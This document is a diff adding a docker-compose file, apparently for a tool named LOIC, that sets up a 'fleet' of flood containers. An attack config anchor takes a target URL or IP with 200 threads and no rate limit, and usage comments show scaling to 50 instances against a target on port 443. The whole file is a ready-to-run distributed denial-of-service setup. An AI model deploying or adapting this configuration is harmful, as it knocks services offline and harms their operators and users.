@@ -1,0 +1,51 @@
+version: "3.8"
+
+x-attack-config: &attack
+  TARGET_URL: ""
+  TARGET_IP: ""
+  PORT: "80"
+  METHOD: http
+  THREADS: "200"
+  DURATION: "300"
+  RATE_LIMIT: "0"
+  RAMP_UP: "0"
+  TLS: "false"
+  QUIET: "true"
+
+services:
+  loic:
+    build: .
+    image: loic:v2
+    network_mode: host
+    restart: "no"
+    command: >
+      loic
+      ${TARGET_URL:+--target-url ${TARGET_URL}}
+      ${TARGET_IP:+--target-ip ${TARGET_IP}}
+      --port ${PORT:-80}
+      --method ${METHOD:-http}
+      --threads ${THREADS:-200}
+      --duration ${DURATION:-300}
+      ${RATE_LIMIT:+--rate-limit ${RATE_LIMIT}}
+      ${RAMP_UP:+--ramp-up ${RAMP_UP}}
+      ${TLS:+--tls}
+      ${QUIET:+--quiet}
+      ${EXTRA_ARGS}
+
+# ── Usage ─────────────────────────────────────
+#
+# 1. Export config:
+#    export TARGET_URL=api.example.com PORT=443 TLS=true DURATION=120 THREADS=300
+#
+# 2. Launch N instances:
+#    docker compose -f docker-compose.fleet.yml up --scale loic=50 -d
+#
+# 3. Watch logs (aggregated):
+#    docker compose -f docker-compose.fleet.yml logs -f
+#
+# 4. Stop all:
+#    docker compose -f docker-compose.fleet.yml down
+#
+# 5. Override with extra args:
+#    EXTRA_ARGS="--payload-size 4096 --jitter 20" \
+#      docker compose -f docker-compose.fleet.yml up --scale loic=20 -d
